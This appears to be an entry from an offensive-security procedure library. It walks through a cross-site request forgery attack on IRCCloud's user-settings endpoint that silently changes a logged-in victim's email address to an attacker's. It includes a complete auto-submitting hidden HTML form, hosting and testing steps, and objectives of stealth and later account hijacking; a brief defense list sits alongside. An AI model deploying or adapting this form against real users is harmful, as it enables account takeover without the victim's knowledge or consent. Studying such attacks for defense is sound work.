---
id: craft-csrf-form-irccloud
tags:
  - csrf
  - web-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:06.540Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft CSRF Form for Email Change

## Summary

This procedure creates a malicious HTML webpage with a hidden form that exploits the CSRF vulnerability in IRCCloud's /chat/user-settings endpoint to change a logged-in user's email address to one controlled by the attacker.

## Description

The attack targets IRCCloud's lack of CSRF protection on the user settings update form. By hosting a simple HTML page with an auto-submitting form, the attacker can forge a POST request using the victim's session cookies when they visit the page while authenticated. The form sets the email field to the attacker's address (e.g., hacker@example.com) and includes other required fields like realname, hwords, autoaway, reqid, and session to mimic a legitimate request. This updates the account's email immediately, paving the way for confirmation hijacking. Prerequisites include hosting capabilities and knowledge of IRCCloud's form parameters.

## Requirements

1. Control over a web hosting service or domain to serve the HTML file
2. Knowledge of the target's session parameters (inferred from browser inspection)
3. Victim must be logged into IRCCloud in their browser

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing endpoints like /chat/user-settings
- Enforce email change confirmations before updating account settings
- Monitor for anomalous email changes and require re-authentication for sensitive updates
- Use Content Security Policy (CSP) to restrict form submissions to same-origin

## Objectives

1. Forge a POST request to update victim email without their consent
2. Ensure submission is invisible to maintain stealth
3. Prepare for subsequent email confirmation interception

## Instructions

### Step 1: Prepare HTML Form Structure

**Context**: Create the base HTML with hidden inputs for all required fields to target the /chat/user-settings endpoint.

**Instructions**: Write an HTML file with a form action set to https://www.irccloud.com/chat/user-settings and method POST. Include hidden inputs for email (attacker's email), realname (arbitrary), hwords (arbitrary), autoaway (false), reqid (timestamp or random), and session (victim's session ID if known, or rely on cookies).

Example form code:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://www.irccloud.com/chat/user-settings" method="POST">
    <input type="hidden" name="email" value="hacker@example.com">
    <input type="hidden" name="realname" value="Victim Name">
    <input type="hidden" name="hwords" value="">
    <input type="hidden" name="autoaway" value="false">
    <input type="hidden" name="reqid" value="1234567890">
    <input type="hidden" name="session" value="victim_session_token">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

> This code auto-submits the form on load using JavaScript, sending the request in the background.

### Step 2: Host and Test the Page

**Context**: Deploy the page to a controlled server and verify it submits correctly.

**Instructions**: Upload the HTML to a web server (e.g., Apache/Nginx on a VPS or free hosting). Test by loading it in a browser logged into IRCCloud; check if email updates (use a test account).

**Expected Output**: Form submits silently; email change reflected in account settings.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web-exploit]]
